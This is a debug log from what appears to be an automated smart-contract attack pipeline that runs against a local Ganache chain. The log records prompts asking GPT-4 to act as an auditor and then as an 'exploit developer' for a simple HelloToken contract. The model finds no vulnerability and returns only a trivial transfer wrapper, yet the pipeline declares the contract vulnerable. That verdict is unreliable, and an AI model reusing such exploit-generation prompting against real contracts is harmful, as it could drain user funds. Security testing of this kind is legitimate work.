'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:15,248 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:15,251 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:15,253 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 09:23:55,024 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:23:55,036 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:23:55,042 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:23:55,047 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 09:23:55,068 - api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 09:23:55,081 - api.contract - INFO - Analyzing code snippet
2025-07-06 09:23:55,098 - api.contract - INFO - Starting contract analysis for user: 1
2025-07-06 09:23:55,104 - services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp96szjclk.sol
2025-07-06 09:23:55,114 - services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-06 09:23:55,116 - services.contract_service - INFO - Compiling contract...
2025-07-06 09:23:55,312 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-07-06 09:23:56,235 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-07-06 09:23:56,240 - solcx - INFO - Using solc version 0.8.0
2025-07-06 09:23:57,859 - services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-07-06 09:23:57,861 - services.contract_service - INFO - Deploying 1 contracts...
2025-07-06 09:23:59,097 - services.contract_service - INFO - Contract HelloToken deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-07-06 09:23:59,100 - services.contract_service - INFO - Setting up contract HelloToken...
2025-07-06 09:23:59,992 - services.contract_service - INFO - Contract HelloToken setup completed
2025-07-06 09:23:59,995 - services.contract_service - INFO - Funding contract HelloToken for attack testing...
2025-07-06 09:24:00,256 - services.contract_service - INFO - Contract HelloToken funded
2025-07-06 09:24:00,258 - services.contract_service - INFO - Building contract observation...
2025-07-06 09:24:00,988 - services.contract_service - INFO - Contract observation built successfully
2025-07-06 09:24:00,990 - services.contract_service - INFO - Generating attack strategy...
2025-07-06 09:24:00,991 - services.contract_service - INFO - Running Slither analysis...
2025-07-06 09:24:05,932 - services.contract_service - WARNING - Failed to run Slither analysis: [Errno 2] No such file or directory: 'slither'
2025-07-06 09:24:06,010 - services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 83, in run_slither
    result_json = subprocess.run(cmd_json)
                  ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'slither'

2025-07-06 09:24:06,012 - modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-06 09:24:06,013 - modules.attack_generator - INFO - Contract name: HelloToken
2025-07-06 09:24:06,016 - modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-06 09:24:06,018 - modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-06 09:24:06,023 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-06 09:24:06,027 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-06 09:24:06,028 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-06 09:24:16,638 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-06 09:24:16,682 - modules.attack_generator - INFO - Received response from OpenAI API in 10.66 seconds
2025-07-06 09:24:16,689 - modules.attack_generator - INFO - Contract analysis completed in 10.66 seconds
2025-07-06 09:24:16,690 - modules.attack_generator - INFO - Vulnerability assessment: - **Standard ERC20 functionality but incomplete:** The contract implements a minimal token transfer ...
2025-07-06 09:24:16,691 - modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-06 09:24:16,692 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-06 09:24:16,694 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-06 09:24:16,694 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-06 09:24:19,107 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-06 09:24:19,125 - modules.attack_generator - INFO - Received response from OpenAI API in 2.43 seconds
2025-07-06 09:24:19,132 - modules.attack_generator - INFO - Attack code generation completed in 2.43 seconds
2025-07-06 09:24:19,135 - modules.attack_generator - INFO - Generated attack code of type solidity with length 359
2025-07-06 09:24:19,137 - modules.attack_generator - INFO - Total attack strategy generation completed in 13.09 seconds
2025-07-06 09:24:19,140 - modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-06 09:24:19,146 - services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp96szjclk.sol",\n  "contracts": [\n    {\n      "contract_name": "HelloToken",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "internalType": "uint8",\n              "name": "",\n              "type": "uint8"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "internalType": "uint256",\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [\n            {\n              "internalType": "bool",\n              "name": "success",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint8",\n              "name": "",\n              "type": "uint8"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "internalType": "uint256",\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "bool",\n              "name": "success",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99975902000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000000000000000000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "name": "HelloToken",\n        "symbol": "HTK",\n        "totalSupply": 1000000000000000000000000\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract HelloToken {\\n    string public name = \\"HelloToken\\";\\n    string public symbol = \\"HTK\\";\\n    uint8 public decimals = 18;\\n    uint public totalSupply = 1000000 * (10 ** uint(decimals));\\n    mapping(address => uint) public balanceOf;\\n\\n    constructor() {\\n        balanceOf[msg.sender] = totalSupply;\\n    }\\n\\n    function transfer(address _to, uint _value) public returns (bool success) {\\n        require(balanceOf[msg.sender] >= _value, \\"Not enough balance\\");\\n        balanceOf[msg.sender] -= _value;\\n        balanceOf[_to] += _value;\\n        return true;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe contract `HelloToken` is a simple ERC20-like token implementation with basic state variables: `name`, `symbol`, `decimals`, `totalSupply`, and a `balanceOf` mapping. The constructor assigns the entire supply to the deployer. The only business logic function is `transfer`, which allows a token holder to send tokens to another address by decreasing the sender‚Äôs balance and increasing the recipient‚Äôs balance.\n\n2. Vulnerability Assessment:  \n- **Standard ERC20 functionality but incomplete:** The contract implements a minimal token transfer mechanism but lacks several standard ERC20 features such as `approve`, `transferFrom`, and events like `Transfer`. This limits its usability but is not a security vulnerability per se.  \n- **No reentrancy risk:** The `transfer` function only updates balances and does not call external contracts or send ETH, so no reentrancy vulnerability exists here.  \n- **No permission issues:** Anyone can call `transfer` to move their own tokens, which is expected. No admin or privileged functions exist.  \n- **No math errors:** Solidity 0.8.0 has built-in overflow/underflow checks, so balance subtraction and addition are safe.  \n- **No ETH or funds held:** The contract has zero ETH balance and does not accept or hold ETH. It only manages token balances internally.  \n- **No backdoors or hidden logic:** The code is straightforward with no suspicious or hidden code paths.  \n- **Economic or logic exploits:** Since the contract does not implement allowance or minting/burning, no inflation or double-spend issues are present. However, the lack of events means token transfers are not easily trackable by off-chain tools, which could be considered a usability flaw but not a security vulnerability.\n\n3. Exploitation Requirements:  \nNo exploitable vulnerabilities were identified in this contract. No setup or special conditions are required to exploit it because no exploitable flaws exist.\n\n---\n\n**Additional notes:**  \n- Solidity version: `pragma solidity ^0.8.0`  \n- This contract is a minimal token contract without full ERC20 compliance. It is safe from common vulnerabilities but limited in functionality.  \n- If this contract is intended for production use, consider adding standard ERC20 features and events for better interoperability and tracking.', 'contract_analysis': 'The contract `HelloToken` is a simple ERC20-like token implementation with basic state variables: `name`, `symbol`, `decimals`, `totalSupply`, and a `balanceOf` mapping. The constructor assigns the entire supply to the deployer. The only business logic function is `transfer`, which allows a token holder to send tokens to another address by decreasing the sender‚Äôs balance and increasing the recipient‚Äôs balance.\n\n2.', 'vulnerability_assessment': '- **Standard ERC20 functionality but incomplete:** The contract implements a minimal token transfer mechanism but lacks several standard ERC20 features such as `approve`, `transferFrom`, and events like `Transfer`. This limits its usability but is not a security vulnerability per se.  \n- **No reentrancy risk:** The `transfer` function only updates balances and does not call external contracts or send ETH, so no reentrancy vulnerability exists here.  \n- **No permission issues:** Anyone can call `transfer` to move their own tokens, which is expected. No admin or privileged functions exist.  \n- **No math errors:** Solidity 0.8.0 has built-in overflow/underflow checks, so balance subtraction and addition are safe.  \n- **No ETH or funds held:** The contract has zero ETH balance and does not accept or hold ETH. It only manages token balances internally.  \n- **No backdoors or hidden logic:** The code is straightforward with no suspicious or hidden code paths.  \n- **Economic or logic exploits:** Since the contract does not implement allowance or minting/burning, no inflation or double-spend issues are present. However, the lack of events means token transfers are not easily trackable by off-chain tools, which could be considered a usability flaw but not a security vulnerability.\n\n3.', 'exploitation_requirements': 'No exploitable vulnerabilities were identified in this contract. No setup or special conditions are required to exploit it because no exploitable flaws exist.', 'analysis_duration': 10.656358003616333}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The contract `HelloToken` is a simple ERC20-like token implementation with basic state variables: `name`, `symbol`, `decimals`, `totalSupply`, and a `balanceOf` mapping. The constructor assigns the entire supply to the deployer. The only business logic function is `transfer`, which allows a token holder to send tokens to another address by decreasing the sender‚Äôs balance and increasing the recipient‚Äôs balance.\n\n2.\n\nVulnerability Assessment: - **Standard ERC20 functionality but incomplete:** The contract implements a minimal token transfer mechanism but lacks several standard ERC20 features such as `approve`, `transferFrom`, and events like `Transfer`. This limits its usability but is not a security vulnerability per se.  \n- **No reentrancy risk:** The `transfer` function only updates balances and does not call external contracts or send ETH, so no reentrancy vulnerability exists here.  \n- **No permission issues:** Anyone can call `transfer` to move their own tokens, which is expected. No admin or privileged functions exist.  \n- **No math errors:** Solidity 0.8.0 has built-in overflow/underflow checks, so balance subtraction and addition are safe.  \n- **No ETH or funds held:** The contract has zero ETH balance and does not accept or hold ETH. It only manages token balances internally.  \n- **No backdoors or hidden logic:** The code is straightforward with no suspicious or hidden code paths.  \n- **Economic or logic exploits:** Since the contract does not implement allowance or minting/burning, no inflation or double-spend issues are present. However, the lack of events means token transfers are not easily trackable by off-chain tools, which could be considered a usability flaw but not a security vulnerability.\n\n3.\n\nExploitation Requirements: No exploitable vulnerabilities were identified in this contract. No setup or special conditions are required to exploit it because no exploitable flaws exist.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n", 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface IHelloToken {\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ncontract Attack {\n    IHelloToken public target;\n\n    constructor(address _target) {\n        target = IHelloToken(_target);\n    }\n\n    function attack(address to, uint256 amount) external {\n        target.transfer(to, amount);\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface IHelloToken {\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ncontract Attack {\n    IHelloToken public target;\n\n    constructor(address _target) {\n        target = IHelloToken(_target);\n    }\n\n    function attack(address to, uint256 amount) external {\n        target.transfer(to, amount);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 2.4307875633239746}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp96szjclk.sol",\n  "contracts": [\n    {\n      "contract_name": "HelloToken",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "internalType": "uint8",\n              "name": "",\n              "type": "uint8"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "internalType": "uint256",\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [\n            {\n              "internalType": "bool",\n              "name": "success",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint8",\n              "name": "",\n              "type": "uint8"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "internalType": "uint256",\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "bool",\n              "name": "success",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99975902000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000000000000000000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "name": "HelloToken",\n        "symbol": "HTK",\n        "totalSupply": 1000000000000000000000000\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract HelloToken {\\n    string public name = \\"HelloToken\\";\\n    string public symbol = \\"HTK\\";\\n    uint8 public decimals = 18;\\n    uint public totalSupply = 1000000 * (10 ** uint(decimals));\\n    mapping(address => uint) public balanceOf;\\n\\n    constructor() {\\n        balanceOf[msg.sender] = totalSupply;\\n    }\\n\\n    function transfer(address _to, uint _value) public returns (bool success) {\\n        require(balanceOf[msg.sender] >= _value, \\"Not enough balance\\");\\n        balanceOf[msg.sender] -= _value;\\n        balanceOf[_to] += _value;\\n        return true;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe contract `HelloToken` is a simple ERC20-like token implementation with basic state variables: `name`, `symbol`, `decimals`, `totalSupply`, and a `balanceOf` mapping. The constructor assigns the entire supply to the deployer. The only business logic function is `transfer`, which allows a token holder to send tokens to another address by decreasing the sender‚Äôs balance and increasing the recipient‚Äôs balance.\n\n2. Vulnerability Assessment:  \n- **Standard ERC20 functionality but incomplete:** The contract implements a minimal token transfer mechanism but lacks several standard ERC20 features such as `approve`, `transferFrom`, and events like `Transfer`. This limits its usability but is not a security vulnerability per se.  \n- **No reentrancy risk:** The `transfer` function only updates balances and does not call external contracts or send ETH, so no reentrancy vulnerability exists here.  \n- **No permission issues:** Anyone can call `transfer` to move their own tokens, which is expected. No admin or privileged functions exist.  \n- **No math errors:** Solidity 0.8.0 has built-in overflow/underflow checks, so balance subtraction and addition are safe.  \n- **No ETH or funds held:** The contract has zero ETH balance and does not accept or hold ETH. It only manages token balances internally.  \n- **No backdoors or hidden logic:** The code is straightforward with no suspicious or hidden code paths.  \n- **Economic or logic exploits:** Since the contract does not implement allowance or minting/burning, no inflation or double-spend issues are present. However, the lack of events means token transfers are not easily trackable by off-chain tools, which could be considered a usability flaw but not a security vulnerability.\n\n3. Exploitation Requirements:  \nNo exploitable vulnerabilities were identified in this contract. No setup or special conditions are required to exploit it because no exploitable flaws exist.\n\n---\n\n**Additional notes:**  \n- Solidity version: `pragma solidity ^0.8.0`  \n- This contract is a minimal token contract without full ERC20 compliance. It is safe from common vulnerabilities but limited in functionality.  \n- If this contract is intended for production use, consider adding standard ERC20 features and events for better interoperability and tracking.', 'reasoning': 'The contract `HelloToken` is a simple ERC20-like token implementation with basic state variables: `name`, `symbol`, `decimals`, `totalSupply`, and a `balanceOf` mapping. The constructor assigns the entire supply to the deployer. The only business logic function is `transfer`, which allows a token holder to send tokens to another address by decreasing the sender‚Äôs balance and increasing the recipient‚Äôs balance.\n\n2.', 'summary': '- **Standard ERC20 functionality but incomplete:** The contract implements a minimal token transfer mechanism but lacks several standard ERC20 features such as `approve`, `transferFrom`, and events like `Transfer`. This limits its usability but is not a security vulnerability per se.  \n- **No reentrancy risk:** The `transfer` function only updates balances and does not call external contracts or send ETH, so no reentrancy vulnerability exists here.  \n- **No permission issues:** Anyone can call `transfer` to move their own tokens, which is expected. No admin or privileged functions exist.  \n- **No math errors:** Solidity 0.8.0 has built-in overflow/underflow checks, so balance subtraction and addition are safe.  \n- **No ETH or funds held:** The contract has zero ETH balance and does not accept or hold ETH. It only manages token balances internally.  \n- **No backdoors or hidden logic:** The code is straightforward with no suspicious or hidden code paths.  \n- **Economic or logic exploits:** Since the contract does not implement allowance or minting/burning, no inflation or double-spend issues are present. However, the lack of events means token transfers are not easily trackable by off-chain tools, which could be considered a usability flaw but not a security vulnerability.\n\n3.', 'code': 'pragma solidity 0.8.0;\n\ninterface IHelloToken {\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ncontract Attack {\n    IHelloToken public target;\n\n    constructor(address _target) {\n        target = IHelloToken(_target);\n    }\n\n    function attack(address to, uint256 amount) external {\n        target.transfer(to, amount);\n    }\n}', 'code_type': 'solidity', 'duration': 13.087145566940308}
2025-07-06 09:24:19,153 - services.contract_service - INFO - Has exploit code: True
2025-07-06 09:24:19,155 - services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-06 09:24:19,157 - services.contract_service - INFO - Final vulnerability determination: True
2025-07-06 09:24:19,158 - services.contract_service - INFO - Attack strategy summary: - **Standard ERC20 functionality but incomplete:** The contract implements a minimal token transfer mechanism but lacks several standard ERC20 features such as `approve`, `transferFrom`, and events like `Transfer`. This limits its usability but is not a security vulnerability per se.  
- **No reentrancy risk:** The `transfer` function only updates balances and does not call external contracts or send ETH, so no reentrancy vulnerability exists here.  
- **No permission issues:** Anyone can call `transfer` to move their own tokens, which is expected. No admin or privileged functions exist.  
